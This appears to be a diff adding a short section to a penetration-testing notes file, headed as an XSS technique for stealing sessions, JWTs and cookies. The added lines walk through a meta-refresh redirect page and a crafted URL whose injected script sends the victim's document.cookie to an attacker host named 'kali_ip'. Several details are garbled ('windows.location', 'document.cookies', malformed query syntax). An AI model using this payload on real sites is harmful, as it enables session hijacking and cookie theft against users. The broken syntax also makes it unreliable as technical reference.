@@ -137,3 +137,12 @@ if (!class_exists('CLI_Runner')) {
 $cli_runner = new CLI_Runner();
 ```
 
+
+## Advanced XSS with redirecting to steal sessions/jwt/cookies
+1. Host a python web server and add index.html 
+```
+<meta http-equiv="refresh" content="0; URL=new_website_url" />
+
+```
+2. craft new_website_url: ``` original_url+params?=windows.location='kali_ip'/document.cookies ```
+3. call local web and will redirect to the victim web and then pass the cookie thru http call back 
